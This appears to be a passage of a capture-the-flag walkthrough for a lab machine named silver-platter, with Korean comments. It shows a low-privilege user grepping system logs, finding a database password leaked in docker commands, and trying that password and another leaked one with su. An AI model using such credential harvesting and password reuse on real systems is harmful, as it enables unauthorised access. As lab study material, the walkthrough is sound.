/var/log/auth.log.2:Dec 13 15:08:51 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:11:15 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/nano default
/var/log/auth.log.2:Dec 13 15:11:15 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:10:28 silver-platter login[742]: pam_unix(login:session): session opened for user tyler(uid=1000) by LOGIN(uid=0)
/var/log/auth.log.2:Dec 13 15:10:28 silver-platter systemd-logind[700]: New session 1 of user tyler.
/var/log/auth.log.2:Dec 13 15:10:28 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 15:38:57 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/apt install docker.io
/var/log/auth.log.2:Dec 13 15:38:57 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=\_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
/var/log/auth.log.2:Dec 13 15:40:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:41:17 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker exec -it postgresql psql -U postgres
/var/log/auth.log.2:Dec 13 15:41:17 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)

# postgres 비밀번호 유출

/var/log/auth.log.2:Dec 13 15:44:30 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=\_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database sivlerpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:44:30 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=\_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:silverpeas-6.3.1
/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=\_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/opt/silvepeas/data --link postgresql:database silverpeas:6.3.1
/var/log/auth.log.2:Dec 13 15:45:57 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:50:38 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/ufw allow 8080
/var/log/auth.log.2:Dec 13 15:50:38 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:51:13 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 15:51:13 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)

# 다운로드한 파일 확인하기

/var/log/auth.log.2:Dec 13 15:53:35 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/wget http://192.168.1.20/silverplatter.zip
/var/log/auth.log.2:Dec 13 15:53:35 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:53:44 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/apt install unzip
/var/log/auth.log.2:Dec 13 15:53:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:53:55 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/unzip silverplatter.zip
/var/log/auth.log.2:Dec 13 15:53:55 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:54:14 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html/html5up-dimension ; USER=root ; COMMAND=/usr/bin/mv assets images index.html LICENSE.txt README.txt ../
/var/log/auth.log.2:Dec 13 15:54:14 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:54:39 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/rm silverplatter.zip
/var/log/auth.log.2:Dec 13 15:54:39 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:54:45 silver-platter sudo: tyler : TTY=tty1 ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/rm -rf html5up-dimension/
/var/log/auth.log.2:Dec 13 15:54:45 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 15:55:31 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
/var/log/auth.log.2:Dec 13 15:55:31 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:17:21 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/passwd tim
/var/log/auth.log.2:Dec 13 16:17:21 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:17:43 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/sbin/ufw allow 22
/var/log/auth.log.2:Dec 13 16:17:43 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:18:10 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/systemctl ssh status
/var/log/auth.log.2:Dec 13 16:18:10 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:18:29 silver-platter sudo: tyler : TTY=tty1 ; PWD=/etc/nginx/sites-available ; USER=root ; COMMAND=/usr/bin/systemctl status ssh
/var/log/auth.log.2:Dec 13 16:18:29 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:18:57 silver-platter sshd[6879]: Accepted password for tyler from 192.168.1.20 port 47772 ssh2
/var/log/auth.log.2:Dec 13 16:18:57 silver-platter sshd[6879]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 16:18:57 silver-platter systemd-logind[700]: New session 5 of user tyler.
/var/log/auth.log.2:Dec 13 16:32:41 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/passwd tim
/var/log/auth.log.2:Dec 13 16:32:41 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:33:03 silver-platter sshd[6977]: Disconnected from user tyler 192.168.1.20 port 47772
/var/log/auth.log.2:Dec 13 16:33:03 silver-platter sshd[6879]: pam_unix(sshd:session): session closed for user tyler
/var/log/auth.log.2:Dec 13 16:35:45 silver-platter sshd[7297]: Accepted password for tyler from 192.168.1.20 port 58172 ssh2
/var/log/auth.log.2:Dec 13 16:35:45 silver-platter sshd[7297]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 16:35:45 silver-platter systemd-logind[700]: New session 8 of user tyler.
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/sudo chsh -s /bin/bash tim
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: root : TTY=pts/1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/chsh -s /bin/bash tim
/var/log/auth.log.2:Dec 13 16:36:35 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 16:37:24 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log/nginx ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 16:37:24 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:37:38 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log/nginx ; USER=root ; COMMAND=/usr/bin/docker exec -it /bin/bash silverpeas
/var/log/auth.log.2:Dec 13 16:37:38 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:37:48 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log/nginx ; USER=root ; COMMAND=/usr/bin/docker exec -it silverpeas /bin/bash
/var/log/auth.log.2:Dec 13 16:37:48 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:40:44 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/mkdir tim
/var/log/auth.log.2:Dec 13 16:40:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:40:51 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/chmod 777 tim
/var/log/auth.log.2:Dec 13 16:40:51 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:41:08 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/usr/bin/chmod 555 tim
/var/log/auth.log.2:Dec 13 16:41:08 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:41:30 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tim ; USER=root ; COMMAND=/usr/bin/nano user.txt
/var/log/auth.log.2:Dec 13 16:41:30 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:45:33 silver-platter sshd[7622]: Accepted password for tyler from 192.168.1.20 port 33484 ssh2
/var/log/auth.log.2:Dec 13 16:45:33 silver-platter sshd[7622]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 16:45:33 silver-platter systemd-logind[700]: New session 9 of user tyler.
/var/log/auth.log.2:Dec 13 16:45:42 silver-platter sudo: tyler : TTY=pts/1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 16:45:42 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 16:45:42 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:43:09 silver-platter sshd[7750]: Accepted password for tyler from 192.168.1.20 port 45796 ssh2
/var/log/auth.log.2:Dec 13 17:43:09 silver-platter sshd[7750]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:43:09 silver-platter systemd-logind[700]: New session 10 of user tyler.
/var/log/auth.log.2:Dec 13 17:43:14 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 17:43:14 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:18 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop silverpeas
/var/log/auth.log.2:Dec 13 17:43:18 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:34 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop postgresql
/var/log/auth.log.2:Dec 13 17:43:34 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:39 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker start postgresql
/var/log/auth.log.2:Dec 13 17:43:39 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:45 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker start silverpeas
/var/log/auth.log.2:Dec 13 17:43:45 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:43:47 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker ps
/var/log/auth.log.2:Dec 13 17:43:47 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:44:33 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/systemctl enable docker
/var/log/auth.log.2:Dec 13 17:44:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:44:46 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop silverpeas
/var/log/auth.log.2:Dec 13 17:44:46 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:45:01 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/docker stop postgresql
/var/log/auth.log.2:Dec 13 17:45:01 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:45:48 silver-platter sudo: tyler : TTY=pts/3 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 17:45:48 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:45:48 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:46:10 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter sshd[1370]: Accepted password for tyler from 192.168.1.20 port 60860 ssh2
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter sshd[1370]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter systemd-logind[708]: New session 2 of user tyler.
/var/log/auth.log.2:Dec 13 17:51:30 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:33 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 17:51:33 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:51:33 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter sshd[1681]: Accepted password for tyler from 192.168.1.20 port 55392 ssh2
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter sshd[1681]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter systemd-logind[706]: New session 2 of user tyler.
/var/log/auth.log.2:Dec 13 17:51:41 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.2:Dec 13 17:51:44 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.2:Dec 13 17:51:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.2:Dec 13 17:51:44 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
grep: /var/log/btmp: Permission denied
grep: /var/log/btmp.1: Permission denied
/var/log/cloud-init.log:2023-12-12 19:31:35,421 - **init**.py[DEBUG]: Adding user tyler
/var/log/cloud-init.log:2023-12-12 19:31:35,421 - subp.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'tyler', '--comment', 'root', '--groups', 'adm,cdrom,dip,lxd,plugdev,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']
/var/log/cloud-init.log:2023-12-12 19:31:43,504 - util.py[DEBUG]: Changing the ownership of /home/tyler/.ssh to 1000:1000
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Writing to /home/tyler/.ssh/authorized_keys - wb: [600] 0 bytes
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Changing the ownership of /home/tyler/.ssh/authorized_keys to 1000:1000
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Reading from /home/tyler/.ssh/authorized_keys (quiet=False)
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Read 0 bytes from /home/tyler/.ssh/authorized_keys
grep: /var/log/dist-upgrade: Is a directory
grep: /var/log/installer: Is a directory
grep: /var/log/journal: Is a directory
grep: /var/log/landscape: Is a directory
grep: /var/log/nginx: Is a directory
grep: /var/log/private: Permission denied
/var/log/syslog.1:May 8 08:58:40 silver-platter systemd[1]: Started Session 2 of User tyler.
/var/log/syslog.1:May 8 14:00:53 silver-platter systemd[1]: Started Session 2 of User tyler.
grep: /var/log/unattended-upgrades: Is a directory
grep: /var/log/wtmp: binary file matches
tim@silver-platter:~$

# 도커 접근 실패 -> sudo 권한 없음

tim@silver-platter:~$ sudo docker exec -it postgres psql -USilverpeas
[sudo] password for tim:
Sorry, try again.
[sudo] password for tim:
tim is not in the sudoers file. This incident will be reported.
tim@silver-platter:~$ sudo docker exec -it postgres psql -USilverpeas

# sudo, su 주로 활용하는 것 파악

# su root 안 됨

tim@silver-platter:~$ find / -name silverplatter 2>/dev/null
tim@silver-platter:~$ su
Password:
su: Authentication failure
tim@silver-platter:~$

# su tyler -> 팀 비밀번호 시도 안 됨 cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol -> 아까 postgres 비밀번호 \_Zd_zx7N823 -> 안 됨

tim@silver-platter:~$ find / -name silverplatter 2>/dev/null
tim@silver-platter:~$ su
Password:
su: Authentication failure
tim@silver-platter:~$ su tyler
Password:
su: Authentication failure
tim@silver-platter:~$

# 로그 일부

/var/log/auth.log.2:Dec 13 15:45:21 silver-platter sudo: tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name silverpeas -p 8080:8000 -d -e DB_NAME=Silverpeas -e DB_USER=silverpeas -e DB_PASSWORD=\_Zd_zx7N823/ -v silverpeas-log:/opt/silverpeas/log -v silverpeas-data:/

# 로그 2차 재귀 분석: grep -iR tyler /var/log/

tim@silver-platter:~$ grep -iR tyler /var/log/
grep: /var/log/amazon: Permission denied
grep: /var/log/wtmp: binary file matches
/var/log/auth.log.1:May 8 08:58:40 silver-platter sshd[1710]: Accepted password for tyler from 192.168.1.20 port 42258 ssh2
/var/log/auth.log.1:May 8 08:58:40 silver-platter sshd[1710]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 08:58:40 silver-platter systemd-logind[711]: New session 2 of user tyler.
/var/log/auth.log.1:May 8 08:58:40 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 08:58:44 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.1:May 8 08:58:44 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.1:May 8 08:58:44 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/auth.log.1:May 8 14:00:53 silver-platter sshd[1946]: Accepted password for tyler from 192.168.1.20 port 55742 ssh2
/var/log/auth.log.1:May 8 14:00:53 silver-platter sshd[1946]: pam_unix(sshd:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 14:00:53 silver-platter systemd-logind[709]: New session 2 of user tyler.
/var/log/auth.log.1:May 8 14:00:53 silver-platter systemd: pam_unix(systemd-user:session): session opened for user tyler(uid=1000) by (uid=0)
/var/log/auth.log.1:May 8 14:01:11 silver-platter sudo: tyler : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/su
/var/log/auth.log.1:May 8 14:01:11 silver-platter sudo: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)
/var/log/auth.log.1:May 8 14:01:11 silver-platter su: pam_unix(su:session): session opened for user root(uid=0) by tyler(uid=0)
/var/log/syslog.1:May 8 08:58:40 silver-platter systemd[1]: Started Session 2 of User tyler.
/var/log/syslog.1:May 8 14:00:53 silver-platter systemd[1]: Started Session 2 of User tyler.
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@00060c62cdfff767-69d92e040e3893c8.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@00060c60820e1bfd-b67d49e49318015d.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@00060c65914530c9-1945e38185741a3f.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@00060c60944e041f-1ed71084930fd9b6.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@000617ed8147f9c4-ef08451dfa7f835a.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@000617f1bb16d65f-cbb5fdcfa0b23b27.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@00060c62ba0aefdf-7318e0fbef468a84.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@00060c5028d78256-2f29871609658f18.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1001.journal: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@1c787f413f9c4e3994a2bcb435082f25-00000000000003c5-00060c659145207a.journal: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@00063a3f0ea72f9c-a12ef0d813fb7fa1.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@000617f20eb74b4e-1f4ec0322f5114b4.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@1a94d482ec724c11a36274b2be6c3142-0000000000000001-00060c62cdfec16a.journal: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@00060c6080f639e9-f480de5c4c514a03.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@000617ed8706907e-4d7911b631d8e187.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/user-1000@000617676b0532a1-789b58b9ea73ae14.journal~: binary file matches
grep: /var/log/journal/d66e774f203b4ca082267956397615f9/system@0006176348e54237-37314503d21fd73c.journal~: binary file matches
/var/log/installer/subiquity-server-debug.log.2061:2023-12-12 18:32:49,766 INFO aiohttp.access:206 [12/Dec/2023:18:32:49 +0000] "GET /identity/validate_username?username=%22tyler%22 HTTP/1.1" 200 190 "-" "Python/3.10 aiohttp/3.8.1"
/var/log/installer/subiquity-server-debug.log:2023-12-12 18:32:49,766 INFO aiohttp.access:206 [12/Dec/2023:18:32:49 +0000] "GET /identity/validate_username?username=%22tyler%22 HTTP/1.1" 200 190 "-" "Python/3.10 aiohttp/3.8.1"
/var/log/installer/subiquity-server-info.log.2061:2023-12-12 18:32:49,766 INFO aiohttp.access:206 [12/Dec/2023:18:32:49 +0000] "GET /identity/validate_username?username=%22tyler%22 HTTP/1.1" 200 190 "-" "Python/3.10 aiohttp/3.8.1"
/var/log/installer/autoinstall-user-data: username: tyler
/var/log/installer/subiquity-client-debug.log.2016:2023-12-12 18:33:08,966 DEBUG subiquity.client.controllers.identity:47 IdentityController.done next_screen user_spec=IdentityData(realname='root', username='tyler', hostname='silver-platter')
/var/log/installer/subiquity-client-debug.log:2023-12-12 18:33:08,966 DEBUG subiquity.client.controllers.identity:47 IdentityController.done next_screen user_spec=IdentityData(realname='root', username='tyler', hostname='silver-platter')
/var/log/installer/subiquity-server-info.log:2023-12-12 18:32:49,766 INFO aiohttp.access:206 [12/Dec/2023:18:32:49 +0000] "GET /identity/validate_username?username=%22tyler%22 HTTP/1.1" 200 190 "-" "Python/3.10 aiohttp/3.8.1"
grep: /var/log/btmp: Permission denied
/var/log/cloud-init.log:2023-12-12 19:31:35,421 - **init**.py[DEBUG]: Adding user tyler
/var/log/cloud-init.log:2023-12-12 19:31:35,421 - subp.py[DEBUG]: Running hidden command to protect sensitive input/output logstring: ['useradd', 'tyler', '--comment', 'root', '--groups', 'adm,cdrom,dip,lxd,plugdev,sudo', '--password', 'REDACTED', '--shell', '/bin/bash', '-m']
/var/log/cloud-init.log:2023-12-12 19:31:43,504 - util.py[DEBUG]: Changing the ownership of /home/tyler/.ssh to 1000:1000
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Writing to /home/tyler/.ssh/authorized_keys - wb: [600] 0 bytes
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Changing the ownership of /home/tyler/.ssh/authorized_keys to 1000:1000
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Reading from /home/tyler/.ssh/authorized_keys (quiet=False)
/var/log/cloud-init.log:2023-12-12 19:31:43,505 - util.py[DEBUG]: Read 0 bytes from /home/tyler/.ssh/authorized_keys
grep: /var/log/private: Permission denied
grep: /var/log/btmp.1: Permission denied
/var/log/auth.log:Jul 19 03:39:20 silver-platter su: pam_unix(su:auth): authentication failure; logname=tim uid=1001 euid=0 tty=/dev/pts/0 ruser=tim rhost= user=tyler
/var/log/auth.log:Jul 19 03:39:21 silver-platter su: FAILED SU (to tyler) tim on pts/0
/var/log/auth.log:Jul 19 03:40:32 silver-platter su: pam_unix(su:auth): authentication failure; logname=tim uid=1001 euid=0 tty=/dev/pts/0 ruser=tim rhost= user=tyler
/var/log/auth.log:Jul 19 03:40:34 silver-platter su: FAILED SU (to tyler) tim on pts/0
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: new group: name=tyler, GID=1000
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: new user: name=tyler, UID=1000, GID=1000, home=/home/tyler, shell=/bin/bash, from=none
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'adm'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'cdrom'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'sudo'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'dip'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'plugdev'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to group 'lxd'
/var/log/auth.log.2:Dec 12 19:31:36 silver-platter useradd[674]: add 'tyler' to shadow group 'adm'
